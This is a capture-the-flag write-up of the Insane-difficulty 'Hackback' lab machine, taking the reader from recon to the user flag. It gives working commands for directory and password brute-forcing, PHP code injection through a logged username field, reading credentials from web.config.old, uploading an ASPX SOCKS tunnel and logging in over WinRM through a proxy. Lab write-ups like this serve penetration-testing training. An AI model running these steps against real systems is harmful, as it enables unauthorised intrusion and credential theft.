## Overview

Hackback is an Insane-difficulty Windows (Server 2019) machine. The path to user is a long web chain: a GoPhish admin login on default credentials reveals the box's phishing vhosts; a `rot13`-encoded `private.js` leaks a "secret" admin URL and the fact that its bypass password is only 8 characters (brute-forced with `ffuf`); the admin panel logs the phishing-login `username` field and then executes it as PHP, giving a file read/write code-execution primitive; that primitive reads cleartext credentials from `web.config.old`. Because WinRM (5985) is firewalled off the host, an ASPX SOCKS tunnel is uploaded through the PHP write primitive, and the recovered creds log in over the proxy as `simple`.

## Recon

| Port  | Service | Notes |
|-------|---------|-------|
| 80    | IIS / HTTP | phishing vhosts + an `admin` vhost |
| 6666  | HTTP/2 API | command interface running as `NETWORK SERVICE` |
| 64831 | HTTPS | GoPhish |

5985/135/445 are **filtered from outside** — WinRM is present but the host firewall blocks it externally, a hint that we'll need an in-band tunnel later.

```bash
nmap -p- --min-rate 1000 -T4 10.129.228.106
nmap -sC -sV -p80,6666,64831 10.129.228.106
```

## Enumeration

GoPhish on `:64831` accepts its documented default credentials `admin:gophish`. Its email templates reveal the box's vhosts — a phishing clone of the HTB login at `www.hackthebox.htb` and an `admin.hackback.htb` vhost.

![gophish](/assets/Images/hackback-001_recon_gophish.png)

The admin vhost's login page source points at a JavaScript folder. `gobuster` finds `private.js`, which is `rot13`-encoded (the tell: the recurring token `ine` is `rot13` of `var`). Decoding it and running it in the browser console prints a "secret" admin path, the expected parameters, and that the bypass password is 8 characters long.

```bash
gobuster dir -u http://admin.hackback.htb/js/ -x js -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
cat private.js | tr 'A-Za-z' 'N-ZA-Mn-za-m' > dec.js
```

![privatejs](/assets/Images/hackback-002_enum_privatejs.png)

The secret path holds `webadmin.php`, gated by that 8-character password. We carve the 8-character slice of `rockyou` and brute the parameter with `ffuf`, filtering the wrong-key response — the password is `12345678`.

```bash
grep -xE '.{8}' /usr/share/wordlists/rockyou.txt > /tmp/p8.txt
ffuf -w /tmp/p8.txt --fw 3 -u 'http://admin.hackback.htb/<secret>/webadmin.php?action=list&site=hackthebox&password=FUZZ&session='
```

![webadmin-pw](/assets/Images/hackback-003_enum_webadmin-pw.png)

## Foothold

The admin panel displays captured phishing logins. It writes the submitted `username` to a log file that `webadmin.php` then renders through PHP — so submitting `<?php … ?>` in the login `username` gets executed. `system()`/`exec` are disabled, but PHP's file functions are not, giving a read/write primitive (the session key is `sha256(attacker_ip)`).

```bash
python3 rce.py 'print_r(scandir("/"))'
```

![phprce](/assets/Images/hackback-004_exploit_phprce.png)

Reading `web.config.old` from the admin web root leaks an impersonation identity in cleartext — `simple:<redacted>`.

```bash
python3 rce.py dl /inetpub/wwwroot/new_phish/admin/web.config.old web.config.old
```

![webconfig](/assets/Images/hackback-005_exploit_webconfig.png)

WinRM is firewalled off the host, but the PHP write primitive can drop a file into a directory IIS executes. We upload a Neo-reGeorg ASPX tunnel and start the client, exposing a local SOCKS5 proxy that reaches the otherwise-unreachable port 5985.

```bash
python3 neoreg.py generate -k <key>
python3 rce.py up tunnel.aspx '/inetpub/wwwroot/new_phish/admin/<secret>/tunnel.aspx'
python3 neoreg.py -k <key> -u http://admin.hackback.htb/<secret>/tunnel.aspx -p 1080
```

![regeorg](/assets/Images/hackback-006_foothold_regeorg.png)

Through the proxy, the recovered credentials authenticate to WinRM as `simple`.

```bash
proxychains4 -f pc.conf netexec winrm 10.129.228.106 -u simple -p '<redacted>' -X 'whoami'
```

![winrm-user](/assets/Images/hackback-007_foothold_winrm-user.png)

## User flag

```bash
type C:\Users\hacker\Desktop\user.txt   # HTB{...}
```

Access as `simple` (a member of `project-managers`) is achieved, and the user flag is captured.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
